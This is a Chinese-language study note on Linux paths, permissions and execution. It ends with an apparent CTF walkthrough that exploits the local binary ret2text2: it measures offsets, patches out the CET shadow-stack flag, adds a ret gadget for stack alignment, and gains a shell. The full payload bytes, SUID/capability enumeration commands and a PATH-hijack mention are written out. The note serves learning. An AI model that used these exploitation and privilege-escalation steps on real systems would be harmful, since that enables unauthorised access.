# **week2**
## Linux笔记
### 路径
- 绝对路径以 / 开头；相对路径相对 cwd  
- .当前；.. 上级；~ 家；- 上次目录（仅 cd -）  
/.. 仍是 /  
~是一个展开项  
- -首先是短选项前缀；单独一个 - 常是标准输入/输出占位；-- 是选项终止符（具体含义必须以命令的 man 为准）  
- 路径每一级目录都要 x；最终文件按操作要 r/w/x  
ls -l 看目录内容；ls -ld 看目录本身    
  - ls  
ls -l          # 长格式，看权限、所有者、大小、时间  
ls -a          # 包括 . 和 .. 以及隐藏文件  
ls -A          # 包括隐藏文件，但不显示 . 和 ..  
ls -h          # 人类可读大小  
ls -d          # 看目录本身，而不是目录内容  
ls -i          # 显示 inode  
ls -n          # 用数字显示 uid/gid  
ls -R          # 递归  
ls -t          # 按修改时间排序  
ls -S          # 按大小排序  
ls -r          # 反向排序  
ls -F          # 在目录后加 /，可执行文件后加 *

ls -l：类型+权限、链接数、所有者、组、大小、时间、名字    
![alt text](image.png)
- 第一列的第一个字符  
 -，就是普通文件；d 是目录；l 是软链接；c 是字符设备；b 是块设备；p 是命名管道；s 是 socket（Unix 套接字)  
 - 硬链接同 inode；软链接独立，相对目标相对链接目录  

命令：pwd、pwd -P、cd、cd -、ls -ld、stat、file、readlink -f、realpath、namei -l、find、findmnt
- pwd - 我在哪个逻辑目录  
pwd -P	- 我在哪个真实物理目录（解析软链接）  
cd	- 切换目录   
stat	- 看 inode、权限、时间等详细元数据  
file	- “猜”文件内容类型  
readlink -f	 -把软链接一路解析成最终真实路径  
realpath	- 把路径规范化为绝对真实路径  
namei -l	- 逐级显示路径每层权限和链接解析  

- find	- 按条件搜索文件，可按 inode、类型等  
[从哪里开始找]  [按什么条件找]  [找到后干什么]
  - 2>/dev/null：把“权限不足”等错误丢掉  
-perm -4000：要求包含 SUID 位  
-perm /4000：只要包含其中任意一个位  
-perm -u=s：GNU find 的 SUID 写法  
findmnt	- 查路径/目录挂在哪个文件系统  
  - find . -name '*.c'  
find . -maxdepth 2 -type f  
find / -type f -perm -4000 2>/dev/null  
find / -type f -perm -0002 2>/dev/null  
find . -type f -exec file {} \;  
### 权限
文件：r 读，w 写，x 执行  
目录：r 列名，w 增删改名，x 进入/穿过  
删除文件看父目录 w+x；sticky 例外  
  
例如所有人都能往 /tmp 里写文件，但你不能删别人建的文件，只有文件主人、目录主人或 root 能删，这就是粘滞位的作用--1777
- 数字：r4 w2 x1；755 644 600 777 4755 2755 1777  
（特殊权限）所有者、组、其他

- 符号：u/g/o/a（主、组、他、所有）
  - +/-/=  
  - X：如果目标是一个文件夹，它会自动赋予执行（进入）权限；如果目标是一个普通文件，只有当这个文件本来就已经对某些用户有执行权限时，它才会赋予执行权限  

chmod 软链接改目标；chown -h 改链接  
chown 通常 root；可能清 SUID/SGID  
umask：文件 666 & ~umask；目录 777 & ~umask；022→644/755  
- SUID 4：euid=文件所有者，显示 s/S；脚本通常无效  
SGID 2：egid=文件组；目录继承组   
ACL：ls -l 末尾 +；getfacl/setfacl  
cap：getcap -r / 2>/dev/null；cap_setuid 可提权  
### 执行
- ELF 要 x；脚本 ./ 要 x，bash 只要 r  
目录 x 是进入/穿过，不是执行目录  
root 可绕过 r/w，但执行普通文件仍需 x  
- shebang：#!（脚本开头：用哪个解释器运行）
  - CRLF 会 bad interpreter  

- file、readelf -h、readelf -l | grep interpreter、ldd、findmnt  
  - Permission denied：无 x／路径目录无 x／noexec／目标是目录  
No such file or directory（文件存在）：loader／shebang／32 位库缺失  
noexec：ELF 不能直接跑；bash script 仍可  
nosuid：忽略 SUID  

cwd  
- 每个进程独立；子进程继承  
cd 只影响当前 shell；脚本/子 shell 不影响父 shell  
  - 程序所在目录 ≠ cwd  

- pwd、pwd -P、cd -、pushd/popd、readlink /proc/$$/cwd  
- /proc/<pid>/：cwd、exe、maps、fd、environ  

core 通常在 cwd；core_pattern 可能是管道  
process('./pwn', cwd=...)；ELF 用绝对路径；gdb set cwd  
- id、uname -a、file、checksec、readelf、ldd  
  - find / -perm -4000 -type f 2>/dev/null  
find / -perm -0002 -type f 2>/dev/null  
  - getcap -r / 2>/dev/null  
  - sudo -l  
  - ls -ld /tmp  
  - findmnt -T /tmp -no OPTIONS  

（ulimit -c unlimited；cat /proc/sys/kernel/core_pattern  
patchelf --set-interpreter ...；ln -s libc  
PATH 默认不含 .；pwn 找不到，./pwn 可以；PATH 劫持）  
#### 易错
（chmod +x ≠ 能运行；还要看 noexec、loader、架构、路径 x  
删除文件看父目录，不看文件 w  
目录 r 和 x 不同：r 列名，x 进入  
软链接权限是装饰性的，看目标  
root 也需要 x 才能执行普通文件  
SUID 对脚本无效；chown 可能清 SUID  
umask 只影响新文件)  
文件名以 - 开头用 ./ 或 --
#### 略
basename、dirname、mkdir、rmdir、rm、cp、mv、df、du、mount  
ln(ln -s /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6用来给题目指定 libc 版本或者配合patchelf修改解释器/依赖) existing new/-s target link、  
  which、type、command -v：命令到底从哪来
## ret2text
### 题目ret2text2
题目传入共享文件夹（用 scp 通过 SSH 把文件复制到虚拟机 /home/pwn/pwn/；SSH 是加密远程登录协议，scp 是「走 SSH 的 cp」）cp根目录下pwn文件夹
#### 观察
- cd切入文件夹，ls -l检查权限，本题需要chmod+x提权，file观察目标架构，发现not stripped(编译时没删符号表 → 函数名main、vuln、backdoor都还在)  
- ./ret2text2运行检查（./	明确告诉 shell「运行当前目录下的这个文件」；不写 ./ 会去 PATH 里找，找不到）  
  - Do you konw ret2text?
It's a easy challenge  
hello  
You failed.  

很好，我失败了
#### 查保护
- checksec --file=ret2text2
  - [*] '/home/pwn/pwn/ret2text2'  
    Arch:       amd64-64-little  
    RELRO:      Partial RELRO  
    Stack:      No canary found  
    - 栈上插一个随机数，函数返回前检查它有没有被改	  
    ：覆盖返回地址不会被发现

    NX:         NX enabled  
     - 栈内存可执行

    PIE:        No PIE (0x400000)  
     - 程序加载地址固定，不会每次随机	  
     ：backdoor 永远是 0x4011ca，可以直接写死

    SHSTK:      Enabled  
    IBT:        Enabled  
    Stripped:   No  

此题保护全关，可以直接覆盖返回地址跳走
- 函数名都在，可以反汇编查一下缓冲区，确定多少字节覆盖
#### 反汇编并量偏移
 - objdump -d -M intel ret2text2 | sed -n '/<*****>:/,/^$/p'  
   - objdump -d = 反汇编；-M intel 用 Intel 语法
   - sed -n '/<***>:/,/^$/p' 只截取这个函数，到空行结束  

(此处有反汇编输出，我找不到了)
  - 发现函数在栈上留256字节给局部变量  
  缓冲区开头到保存的 rbp为256 字节  
  保存的 rbp 到返回地址	再 8 字节  
  read 最多读320 字节	够 264 + 8
  - 发现SHSTK: Enabled / IBT: Enabled，这是 Intel CET（控制流保护）的编译标记，影子栈（SHSTK）如果真被内核启用，ret 会被拦下来

  不管了，先gdb量一下
  - python3 -c "open('/tmp/p','wb').write(b'A'*264 + b'B'*8)"
    - 把缓冲区、rbp、返回地址全部覆盖  

  - gdb -q ./ret2text2--进入高蛋白  
  set pagination off  
run < /tmp/p

RIP  0x4011c9 (vuln+51) ◂— ret
- 被影子栈拦截了（正常 call 时，CPU 把返回地址压进普通栈，同时（若开启 CET）再压一份到一块用户态不可写的"影子栈"，ret 时两份必须相等）

##### 寻求帮助
export GLIBC_TUNABLES=glibc.cpu.hwcaps=-SHSTK 尝试在进程级关掉影子栈  
- 本地关 CET 只是为了让这道为"无 CET 环境"设计的题能复现。真正的比赛靶机多半是老内核或没开 CET，题目才可能按 ret2text 出。反过来，如果哪天你遇到远程也开了 CET 的题，那就说明出题人期望的不是覆盖返回地址——这时候 SHSTK 就是你必须正面处理的保护，而不是绕过的障碍。

顺便说一句：IBT: Enabled 这题不用管，因为 backdoor 开头正好有 endbr64（合法的间接跳转落点），跳过去不会触发 IBT。
- export没有起作用

结论：那个 tunable 没能关掉影子栈（至少在这台机器的内核 + glibc 组合上不管用）。这也说明必须做一件事：把 ELF 里"我要开影子栈"的声明改掉。

为什么改 ELF 能解决
readelf -n ret2text2 会看到一段 .note.gnu.property，里面写着 x86 feature: IBT, SHSTK。这是编译器（-fcf-protection）塞进去的标记，加载器读到它就去请求内核开影子栈。把它改成 0，等价于用 -fcf-protection=none 重新编译——程序自己不再要求，内核就不开。
- 成功解决影子栈

#### 堆栈平衡与EOF
pwn@pwn-ubuntu:~/pwn$ ( python3 -c "import sys;sys.stdout.buffer.write(b'A'*264+(0x4011ca).to_bytes(8,'little'))"; cat ) | ./ret2text2_nocet  
Do you konw ret2text?  
It's a easy challenge  
id; echo PWNED; ls -la /  
Segmentation fault (core dumped)  
pwn@pwn-ubuntu:~/pwn$  
- 又崩了，但这次问题不一样，是ret进去的栈是不对齐的
  - x86-64 的 ABI 规定：函数入口处 rsp 必须是 16 字节对齐 + 8（因为 call 压了一个返回地址）

- 算一下  
vuln 的 rbp 是 16 对齐的  
leave 之后 ret 弹掉返回地址 → 进入 backdoor 时 rsp 恰好是 16 对齐  
但 backdoor 以为自己是被 call 进来的，于是 push rbp → call system，传给 system 的栈偏了 8 字节  
system 内部用了 movaps 这类要求 16 对齐的指令 → SIGSEGV
- 解决
在payload里多加一个ret正好对齐8字节  
( python3 -c "import sys;sys.stdout.buffer.write(b'A'*264+(0x40101a).to_bytes(8,'little')+(0x4011ca).to_bytes(8,'little'))"; cat ) | ./ret2text2_nocet

pwn@pwn-ubuntu:~/pwn$ readelf -n ret2text2_nocet | grep -i "feature"  
      Properties: x86 feature: <None>  
pwn@pwn-ubuntu:~/pwn$ ( python3 -c "import sys;sys.stdout.  buffer.write(b'A'*264+(0x40101a).to_bytes(8,'little')+(0x4011ca).to_bytes(8,'little'))"; cat ) | ./ret2text2_nocet  
Do you konw ret2text?  
It's a easy challenge  
id; echo PWNED; ls -la /  
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),123(lxd)  
PWNED  
total 4194404  
drwxr-xr-x  23 root root       4096 Oct 22 12:29 .  
drwxr-xr-x  23 root root       4096 Oct 22 12:29 ..  
lrwxrwxrwx   1 root root          7 Apr 22  2024 bin -> usr/bin  
drwxr-xr-x   2 root root       4096 Feb 26  2024 bin.usr-is-merged  
drwxr-xr-x   5 root root       4096 Oct 22 12:39 boot  
dr-xr-xr-x   2 root root       4096 Sep 15 07:19 cdrom  
drwxr-xr-x  20 root root       4220 Oct 25 18:46 dev  
drwxr-xr-x 143 root root      12288 Oct 22 12:56 etc  
drwxr-xr-x   3 root root       4096 Oct 22 12:30 home  
lrwxrwxrwx   1 root root          7 Apr 22  2024 lib -> usr/lib  
lrwxrwxrwx   1 root root          9 Apr 22  2024 lib64 -> usr/lib64  
drwxr-xr-x   2 root root       4096 Apr  8  2024 lib.usr-is-merged  
drwx------   2 root root      16384 Oct 22 12:21 lost+found  
drwxr-xr-x   3 root root       4096 Oct 22 12:47 media  
drwxr-xr-x   3 root root       4096 Oct 23 11:32 mnt  
drwxr-xr-x   2 root root       4096 Sep 15 03:03 opt  
dr-xr-xr-x 234 root root          0 Oct 25 18:46 proc  
drwx------   7 root root       4096 Oct 22 12:41 root  
drwxr-xr-x  37 root root        960 Oct 25 18:56 run  
lrwxrwxrwx   1 root root          8 Apr 22  2024 sbin -> usr/sbin  
drwxr-xr-x   2 root root       4096 Mar 31  2024 sbin.usr-is-merged  
drwxr-xr-x  13 root root       4096 Sep 15 03:09 snap  
drwxr-xr-x   2 root root       4096 Sep 15 03:03 srv  
-rw-------   1 root root 4294967296 Oct 22 12:29 swap.img  
dr-xr-xr-x  13 root root          0 Oct 25 18:46 sys  
drwxrwxrwt  19 root root       4096 Oct 25 18:51 tmp  
drwxr-xr-x  12 root root       4096 Sep 15 03:03 usr  
drwxr-xr-x  14 root root       4096 Oct 22 12:40 var  
#### 成功拿下第一个shell
下周再次复盘